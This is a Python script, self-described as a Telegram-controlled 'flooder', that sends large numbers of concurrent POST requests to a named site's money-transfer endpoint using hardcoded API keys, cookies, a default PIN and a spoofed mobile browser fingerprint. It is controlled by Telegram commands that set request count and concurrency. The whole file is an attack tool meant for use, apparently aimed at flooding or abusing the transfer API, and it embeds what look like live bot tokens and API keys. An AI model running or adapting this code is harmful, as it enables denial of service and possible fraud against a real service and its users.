#!/usr/bin/env python3
"""
Telegram‑controlled flooder for txg‑gateway.xyz – ready for Railway.
"""
import asyncio
import os
import time
from itertools import cycle

from aiohttp import web, ClientSession, TCPConnector
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ─── Configuration ─────────────────────────────────────
URL = "https://txg-gateway.xyz/client/api/send.php"

# Bot token & owner – you can override with env vars
BOT_TOKEN = os.getenv("BOT_TOKEN", "8822885362:AAFqWv1vAniTnKwuSKI0FwO7mBIuBq3qOw8")
OWNER_ID = int(os.getenv("OWNER_ID", "8401097557"))

# Two API configs (you can add more)
CONFIGS = [
    {
        "api_key": "86864a72c5e2f3ad32c1c8f52710959f",
        "cookie": "api_key=86864a72c5e2f3ad32c1c8f52710959f",
        "toUser": "6283146815",
    },
    {
        "api_key": "f692ed462bc0976b5332a11944103df7",
        "cookie": "api_key=f692ed462bc0976b5332a11944103df7",
        "toUser": "9359202967",
    },
]

BASE_HEADERS = {
    "Host": "txg-gateway.xyz",
    "sec-ch-ua-platform": '"Android"',
    "User-Agent": "Mozilla/5.0 (Linux; Android 16; CPH2729 Build/BP2A.250605.015) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.7922.199 Mobile Safari/537.36",
    "sec-ch-ua": '"Not=A?Brand";v="99", "Android WebView";v="151", "Chromium";v="151"',
    "Content-Type": "application/json",
    "sec-ch-ua-mobile": "?1",
    "Accept": "*/*",
    "Origin": "https://txg-gateway.xyz",
    "X-Requested-With": "inha.gcu.ee",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "Referer": "https://txg-gateway.xyz/dashboard/send.php",
    "Accept-Encoding": "gzip, deflate",      # no br
    "Accept-Language": "en-IN,en-US;q=0.9,en;q=0.8",
    "Priority": "u=1, i",
}

# ─── Global state ─────────────────────────────────────
flood_task = None
stop_flood = False
current_stats = {
    "total": 0,
    "done": 0,
    "success": 0,
    "errors": 0,
    "start_time": None,
    "running": False,
    "concurrency": 0,
}

# ─── Send one request ─────────────────────────────────
async def send_one(session, config, semaphore):
    global current_stats
    if stop_flood:
        return None
    async with semaphore:
        headers = {**BASE_HEADERS, "Cookie": config["cookie"]}
        payload = {
            "toUser": config["toUser"],
            "amount": 1,
            "api_key": config["api_key"],
            "secret_pin": "1234",
            "remark": "Ultra pelo",
            "public": True,
            "manual": False,
        }
        try:
            async with session.post(URL, json=payload, headers=headers, timeout=5) as resp:
                await resp.text()
                if resp.status == 200:
                    current_stats["success"] += 1
                else:
                    current_stats["errors"] += 1
                return resp.status
        except Exception:
            current_stats["errors"] += 1
            return None

# ─── Flood runner ──────────────────────────────────────
async def run_flood(total, concurrency):
    global flood_task, stop_flood, current_stats
    stop_flood = False
    current_stats.update({
        "total": total,
        "done": 0,
        "success": 0,
        "errors": 0,
        "start_time": time.time(),
        "running": True,
        "concurrency": concurrency,
    })

    connector = TCPConnector(ssl=False, limit=0)
    semaphore = asyncio.Semaphore(concurrency)
    config_cycle = cycle(CONFIGS)

    async with ClientSession(connector=connector) as session:
        tasks = []
        for i in range(total):
            if stop_flood:
                break
            config = next(config_cycle)
            tasks.append(send_one(session, config, semaphore))
            if i % 100 == 0:
                await asyncio.sleep(0)

        results = await asyncio.gather(*tasks, return_exceptions=True)
        current_stats["done"] = len(results)
        current_stats["running"] = False

        # Final report to owner
        elapsed = time.time() - current_stats["start_time"]
        msg = (f"🏁 Flood finished!\n"
               f"Total: {current_stats['total']}\n"
               f"Done: {current_stats['done']}\n"
               f"Success (200): {current_stats['success']}\n"
               f"Errors: {current_stats['errors']}\n"
               f"Time: {elapsed:.2f}s\n"
               f"Rate: {current_stats['done']/elapsed:.1f} req/s")
        await bot_app.bot.send_message(chat_id=OWNER_ID, text=msg)

# ─── Telegram Handlers ────────────────────────────────
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("Unauthorized.")
        return
    await update.message.reply_text(
        "🤖 Flood Bot\n"
        "Commands:\n"
        "/start_flood <total> <concurrency> – start flood\n"
        "/stop – stop current flood\n"
        "/status – show current status\n"
        "/help – show this"
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("Unauthorized.")
        return
    await update.message.reply_text(
        "/start_flood <total> <concurrency>\n"
        "/stop\n"
        "/status"
    )

async def start_flood(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global flood_task, current_stats
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("Unauthorized.")
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /start_flood <total> <concurrency>")
        return
    try:
        total = int(args[0])
        concurrency = int(args[1])
    except ValueError:
        await update.message.reply_text("Invalid numbers.")
        return

    if current_stats["running"]:
        await update.message.reply_text("A flood is already running. Use /stop first.")
        return

    await update.message.reply_text(f"Starting flood: {total} requests, concurrency {concurrency}")
    flood_task = asyncio.create_task(run_flood(total, concurrency))

async def stop_flood_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global stop_flood, current_stats
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("Unauthorized.")
        return
    if not current_stats["running"]:
        await update.message.reply_text("No flood is running.")
        return
    stop_flood = True
    await update.message.reply_text("Stopping flood... (may take a moment)")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("Unauthorized.")
        return
    stats = current_stats
    if not stats["running"]:
        await update.message.reply_text("No flood running.")
        return
    elapsed = time.time() - stats["start_time"] if stats["start_time"] else 0
    msg = (f"📊 Status:\n"
           f"Total: {stats['total']}\n"
           f"Done: {stats['done']}\n"
           f"Success: {stats['success']}\n"
           f"Errors: {stats['errors']}\n"
           f"Concurrency: {stats['concurrency']}\n"
           f"Elapsed: {elapsed:.1f}s\n"
           f"Rate: {stats['done']/elapsed:.1f} req/s" if elapsed > 0 else "Rate: N/A")
    await update.message.reply_text(msg)

# ─── Web server ──────────────────────────────────────
async def health(request):
    return web.Response(text="Flooder is running")

async def init_app():
    app = web.Application()
    app.router.add_get('/', health)
    return app

# ─── Main ──────────────────────────────────────────────
async def main():
    # Start web server
    port = int(os.getenv("PORT", "8080"))
    web_app = await init_app()
    runner = web.AppRunner(web_app)
    await runner.setup()
    site = web.TCPSite(runner, host='0.0.0.0', port=port)

    # Start bot
    global bot_app
    bot_app = Application.builder().token(BOT_TOKEN).build()
    bot_app.add_handler(CommandHandler("start", start))
    bot_app.add_handler(CommandHandler("help", help_command))
    bot_app.add_handler(CommandHandler("start_flood", start_flood))
    bot_app.add_handler(CommandHandler("stop", stop_flood_cmd))
    bot_app.add_handler(CommandHandler("status", status))

    await asyncio.gather(
        site.start(),
        bot_app.initialize(),
        bot_app.start(),
        bot_app.updater.start_polling()
    )

    # Keep running
    try:
        await asyncio.Event().wait()
    except KeyboardInterrupt:
        pass
    finally:
        await bot_app.updater.stop()
        await bot_app.stop()
        await runner.cleanup()

if __name__ == "__main__":
    asyncio.run(main())
